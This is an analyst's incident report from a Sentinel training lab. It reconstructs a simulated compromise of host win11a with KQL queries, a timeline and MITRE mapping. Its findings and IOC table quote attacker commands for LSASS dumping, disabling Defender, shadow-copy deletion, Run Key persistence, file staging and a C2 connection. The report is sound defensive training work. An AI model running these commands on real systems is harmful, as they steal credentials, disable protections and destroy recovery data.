# Incident Investigation Report: Multi-Stage Compromise on WIN11A

## Microsoft Sentinel + Microsoft Defender Unified Portal | CrowdStrike Logs

**Analyst:** Harman Jot  
**Environment:** Microsoft Sentinel Training Lab (Azure)  
**Primary Platform:** Microsoft Sentinel + Microsoft Defender Unified Portal  
**Data Sources:** CrowdStrike Falcon logs, Windows Security Event Logs  
**Tools:** Microsoft Sentinel, Microsoft Defender Unified Portal, KQL, MITRE ATT&CK

---

## 1. Summary

An investigation into CrowdStrike endpoint telemetry identified a multi-stage compromise on host **win11a** involving malicious file execution, repeated credential dumping through LSASS, command-and-control activity, security-tool tampering, sensitive file staging, PowerShell execution, persistence, and ransomware-related pre-encryption behavior.

The investigation was initiated by a Microsoft Sentinel incident generated from a Windows Security **Event ID 1102**, indicating that the Security audit log had been cleared.

The Windows Security event was then correlated with CrowdStrike telemetry for **win11a** and the associated user **mirage**, allowing the broader attack sequence to be reconstructed.

The investigation demonstrated the following workflow:

**Sentinel incident → KQL investigation → CrowdStrike timeline reconstruction → targeted threat hunting → Windows Security correlation → attack-chain reconstruction**

---

## 2. Triggering Alert and Incident

| Field | Value |
|---|---|
| Rule name | **NRT Security Event log cleared** |
| Rule description | Detects Windows Security Event ID 1102, indicating that the Security event log was cleared |
| Severity | Medium |
| Scope | 1 device, 1 user |
| Account | `PKWORK\mirage` |
| Computer | `win11a.pkwork.onmicrosoft.com` |
| Event | Windows Security Event ID 1102 |

The Sentinel analytics rule detected the **log-clearing activity itself**. The event was then used as the starting point for broader investigation.

The analytics rule was not treated as proof of the entire compromise. Instead, it provided the initial investigative pivot into the CrowdStrike telemetry associated with the affected host.

---

## 3. Investigation Scope

The investigation focused on:

- **Host:** `win11a`
- **CrowdStrike Agent ID:** `cs-aid-win11a-0001`
- **User:** `mirage`
- **Local IP:** `10.0.1.50`
- **CrowdStrike host external IP:** `159.31.1.217`

Additional external IP values were observed in individual CrowdStrike detection records, including `198.51.100.42` and `192.0.2.100`. These were retained as **detection-level network context** rather than being treated interchangeably with the host's `ExternalIp` field.

---

## 4. Investigation Workflow

### Step 1 — Review the Sentinel incident

The investigation began with the **NRT Security Event log cleared** incident generated from Event ID 1102.

### Step 2 — Establish the CrowdStrike attack timeline

A host-based search against `CrowdStrikeAlerts` was used to identify activity associated with `win11a`.

### Step 3 — Pivot to targeted LSASS hunting

A dedicated search for `lsass` in `CrowdStrikeDetections` was performed to investigate the credential-dumping activity.

### Step 4 — Examine technical detection details

CrowdStrike detection records were reviewed for command lines, parent processes, users, and external IP context.

### Step 5 — Investigate persistence

A targeted search for `reg add` identified the Registry Run Key persistence command.

### Step 6 — Validate endpoint context

`CrowdStrikeHosts` was queried to establish the identity and network information of `win11a`.

### Step 7 — Correlate Windows Security telemetry

Windows Security Event ID 1102 was queried to independently confirm the audit-log-clearing activity.

---

## 5. KQL Queries Used

### 5.1 CrowdStrike Attack Timeline

    CrowdStrikeAlerts
    | where * contains "win11a"
    | project Timestamp, Description

**Purpose:** Identify CrowdStrike alerts associated with `win11a` and reconstruct the overall attack progression.

---

### 5.2 Targeted LSASS Investigation

    CrowdStrikeDetections
    | where * contains "lsass"
    | project TimeGenerated, Cmdline, ParentDetails, UserName, Entities

**Purpose:** Investigate credential-dumping activity and examine the command line, parent process, user, and associated entities.

---

### 5.3 CrowdStrike Detection and External-IP Correlation

    CrowdStrikeDetections
    | where * contains "win11a"
    | extend ExternalIP = tostring(HostInfo.external_ip)
    | project Cmdline, ParentDetails, UserName, ExternalIP

**Purpose:** Correlate suspicious command-line activity with the user and external-IP context contained in the CrowdStrike detection records.

---

### 5.4 Registry Run Key Persistence Hunt

    CrowdStrikeDetections
    | where * contains "win11a" and * contains "reg add"
    | project TimeGenerated, UserName, Cmdline

**Purpose:** Identify Registry Run Key persistence activity associated with the investigated host.

---

### 5.5 Host Validation

    CrowdStrikeHosts
    | where * contains "win11a"
    | project TimeGenerated, BiosManufacturer, ConnectionIp, DeviceId, ExternalIp

**Purpose:** Establish the endpoint identity and network context for `win11a`.

---

### 5.6 Windows Security Event ID 1102

    SecurityEvent
    | where EventID == 1102
    | project TimeGenerated, Account, Computer, Activity, AccountType

**Purpose:** Correlate the Sentinel triggering incident with the Windows Security audit-log-clearing event.

---

## 6. Attack Timeline

The investigation timeline consists of two correlated evidence streams. **Windows Security Event ID 1102 provided the initial Sentinel investigation trigger**, after which CrowdStrike telemetry for `win11a` was examined to reconstruct the subsequent endpoint activity.

| Time | Event | MITRE Tactic | Technique |
|---|---|---|---|
| Initial trigger | Windows Security Event ID 1102 — Security audit log cleared | Defense Evasion | T1070.001 – Clear Windows Event Logs |
| 8:46 AM | Malicious file executed (`report.exe`) | Execution | T1204.002 – User Execution: Malicious File |
| 8:51 AM | LSASS credential dumping | Credential Access | T1003.001 – OS Credential Dumping: LSASS Memory |
| 9:18 AM | Outbound connection to C2 infrastructure | Command and Control | T1071.001 – Web Protocols |
| 11:43 AM–12:42 PM | Repeated LSASS dumping | Credential Access | T1003.001 – OS Credential Dumping: LSASS Memory |
| 11:49 AM–12:38 PM | Repeated C2 activity | Command and Control | T1071 – Application Layer Protocol |
| 11:54 AM | Security tooling tampering | Defense Evasion | T1562.001 – Impair Defenses: Disable or Modify Tools |
| 11:57 AM onward | Suspicious/encoded PowerShell execution | Execution | T1059.001 – PowerShell |
| 12:01 PM onward | Sensitive file staging | Collection | T1005 – Data from Local System |
| 12:20 PM | Shadow-copy deletion / ransomware preparation | Impact | T1490 – Inhibit System Recovery |

The timeline was reconstructed primarily from **CrowdStrikeAlerts**, with individual command-line and process-context details validated through **CrowdStrikeDetections** and host information validated through **CrowdStrikeHosts**.

> **Chronology note:** Event ID 1102 was the initial Sentinel investigation trigger and preceded the later CrowdStrike activity documented above. The available telemetry establishes these as correlated investigation evidence but does **not** establish that the CrowdStrike activity caused the log-clearing event.

---

## 7. Key Findings

### 7.1 Initial Execution

CrowdStrike telemetry identified execution of:

    C:\Users\mirage\Downloads\report.exe

This represented the initial malicious payload associated with the investigated attack chain.

---

### 7.2 LSASS Credential Dumping

Multiple CrowdStrike detections identified:

    rundll32.exe comsvcs.dll MiniDump

The activity appeared under different parent processes, including:

- `cmd.exe`
- `explorer.exe`
- `wmiprvse.exe`
- `svchost.exe`

The repeated executions demonstrated sustained credential-dumping activity rather than a single isolated event.

---

### 7.3 Command and Control

CrowdStrike detection telemetry identified:

    report.exe --connect update-service-cdn.xyz

The associated detection record also contained external-IP context.

The investigation treated the domain/connection as part of the observed C2 activity rather than relying solely on the external-IP field to establish the destination.

---

### 7.4 Defense Evasion

CrowdStrike detected:

    Set-MpPreference -DisableRealtimeMonitoring $true

This indicates an attempt to disable Windows Defender real-time monitoring and represents defense-evasion behavior.

---

### 7.5 PowerShell Execution

CrowdStrike telemetry identified encoded PowerShell execution:

    powershell.exe -enc SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0AA==

This was treated as suspicious PowerShell execution within the broader attack chain.

---

### 7.6 Sensitive File Staging

The following command was observed:

    xcopy "C:\Users\*\Documents\*.docx" C:\Temp\staging

This indicates collection and staging of document files from user directories.

---

### 7.7 Ransomware Preparation

CrowdStrike telemetry directly identified:

    vssadmin.exe delete shadows /all /quiet

Deleting Volume Shadow Copies removes Windows recovery points and is consistent with ransomware preparation and impact activity.

---

### 7.8 Persistence

A Registry Run Key was created using:

    reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v UpdateSvc /t REG_SZ /d C:\Users\mirage\AppData\Local\Temp\svchost_update.exe /f

This establishes persistence through the Registry Run Keys mechanism.

**MITRE:** T1547.001 – Registry Run Keys / Startup Folder.

---

### 7.9 Anti-Forensics

Windows Security telemetry identified:

    Event ID 1102

associated with:

    Account: PKWORK\mirage
    Computer: win11a.pkwork.onmicrosoft.com

Event ID 1102 indicates that the Windows Security audit log was cleared.

This activity occurred before the later CrowdStrike-detected attack activity and provided the original Sentinel investigation trigger.

---

## 8. Indicators of Compromise

| Type | Value | Relevance |
|---|---|---|
| File | `C:\Users\mirage\Downloads\report.exe` | Initial malicious payload |
| Command | `rundll32.exe comsvcs.dll MiniDump` | LSASS credential dumping |
| Command | `report.exe --connect update-service-cdn.xyz` | C2 activity |
| Command | `powershell.exe -enc ...` | Encoded PowerShell |
| Command | `Set-MpPreference -DisableRealtimeMonitoring $true` | Defense evasion |
| Command | `xcopy "C:\Users\*\Documents\*.docx" C:\Temp\staging` | File staging |
| Command | `vssadmin.exe delete shadows /all /quiet` | Shadow-copy deletion |
| Registry | `HKCU\Software\Microsoft\Windows\CurrentVersion\Run\UpdateSvc` | Persistence |
| Account | `mirage@pkwork.onmicrosoft.com` | Associated compromised account |
| Host | `win11a` | Investigated endpoint |
| Agent ID | `cs-aid-win11a-0001` | CrowdStrike endpoint identifier |
| Internal IP | `10.0.1.50` | Endpoint network context |
| External IP | `159.31.1.217` | CrowdStrike host context |
| External IP | `198.51.100.42` | Detection-level network context |
| External IP | `192.0.2.100` | Detection associated with `report.exe` C2 activity |
| Domain | `update-service-cdn.xyz` | Observed C2 domain |

*Note: The external IP addresses observed in this lab environment include documentation/test ranges and simulated telemetry. They should not be treated as real-world indicators without independent validation.*

---

## 9. Analytical Notes

The investigation used broad host-based searches to establish the initial scope and then narrowed the investigation through targeted queries.

The `CrowdStrikeDetections` search for `lsass` provided a focused pivot into credential-dumping activity, while the Registry Run Key search identified persistence.

### Chronology and Correlation

Windows Security **Event ID 1102** provided the initial Sentinel investigation trigger. The subsequent investigation of CrowdStrike telemetry identified the multi-stage endpoint activity associated with `win11a`.

The available evidence supports a **correlation** between the log-clearing event and the broader endpoint investigation. However, the evidence does not establish a causal relationship between the later CrowdStrike-detected activity and the earlier log-clearing event. Therefore, the report does not claim that the CrowdStrike activity caused the Event ID 1102 activity.

### Network Context

The external-IP values were interpreted according to the field in which they appeared.

`CrowdStrikeHosts` identified:

- `159.31.1.217` as the host's `ExternalIp`
- `10.0.1.50` as the host's local/connection IP

Individual `CrowdStrikeDetections` additionally contained:

- `198.51.100.42`
- `192.0.2.100`

These values were treated as **detection-level network context**, rather than being treated interchangeably with the host's `ExternalIp`.

In particular, the detection containing:

    report.exe --connect update-service-cdn.xyz

was associated with `192.0.2.100`.

This distinction was maintained to avoid incorrectly treating every external IP observed in endpoint telemetry as the compromised host's external IP or automatically as a C2 destination.

---

## 10. Investigation Conclusion

The investigation established a coherent multi-stage compromise involving:

**Windows Security Log Clearing → Malicious File Execution → LSASS Credential Dumping → C2 Activity → Defense Evasion → PowerShell Execution → File Staging → Persistence → Shadow-Copy Deletion**

The Sentinel incident provided the initial investigative trigger through Windows Security Event ID 1102. CrowdStrike telemetry then supplied the primary evidence used to reconstruct the broader endpoint attack chain, while Windows Security telemetry independently confirmed the audit-log-clearing activity.

The investigation demonstrates the use of **Microsoft Sentinel, Microsoft Defender Unified Portal, CrowdStrike telemetry, KQL hunting, endpoint correlation, timeline reconstruction, and MITRE ATT&CK mapping** within a SOC investigation workflow.

---

## 11. Recommendations

- Isolate `win11a` pending further forensic review.
- Reset credentials associated with the compromised `mirage` account.
- Review and remove the identified Registry Run Key persistence.
- Investigate the observed C2 domain and associated network activity.
- Review backup and Volume Shadow Copy status following the shadow-copy deletion.
- Investigate additional authentication or endpoint activity associated with the compromised account.

---

## 12. Evidence / Screenshots

    Screenshots/
    ├── 01_sentinel_incident_nrt_security_event_log_cleared.png
    ├── 02_analytics_rule_nrt_security_event_log_cleared.png
    ├── 03_crowdstrike_alerts_win11a_part1.png
    ├── 04_crowdstrike_alerts_win11a_part2.png
    ├── 05_crowdstrike_lsass_hunt.png
    ├── 06_crowdstrike_initial_attack_activity.png
    ├── 07_crowdstrike_defense_evasion_and_collection.png
    ├── 08_crowdstrike_ransomware_vssadmin.png
    ├── 09_crowdstrike_host_win11a.png
    ├── 10_registry_run_key_persistence.png
    └── 11_security_event_1102_log_cleared.png

### Evidence Mapping

| Screenshot | Evidence |
|---|---|
| 01 | Sentinel incident that initiated the investigation |
| 02 | Analytics rule responsible for detecting Event ID 1102 |
| 03 | Early CrowdStrike attack timeline |
| 04 | Later CrowdStrike attack timeline including ransomware behavior |
| 05 | Targeted LSASS credential-dumping investigation |
| 06 | Initial malicious execution, LSASS and C2 technical evidence |
| 07 | Defense evasion, PowerShell, collection and additional LSASS activity |
| 08 | Direct `vssadmin.exe delete shadows` evidence |
| 09 | `win11a` host identity and host-level network context |
| 10 | Registry Run Key persistence |
| 11 | Windows Security Event ID 1102 / audit-log clearing |

---

## 13. Methodology

The investigation was conducted by:

1. Reviewing the Sentinel incident generated by the **NRT Security Event log cleared** analytics rule.
2. Querying `CrowdStrikeAlerts` to establish the chronological attack timeline for `win11a`.
3. Pivoting to `CrowdStrikeDetections` for targeted LSASS investigation and technical command-line analysis.
4. Investigating Registry Run Key persistence through a targeted CrowdStrike query.
5. Validating host identity and network context through `CrowdStrikeHosts`.
6. Correlating the CrowdStrike findings with Windows Security Event ID 1102.
7. Mapping the confirmed behaviors to MITRE ATT&CK techniques.
8. Reconstructing the attack chain from the available endpoint and Windows telemetry.

---

*This investigation was conducted in a Microsoft Sentinel Training Lab environment using Microsoft's publicly available Sentinel Training Lab dataset as part of independent SOC analyst skills development.*
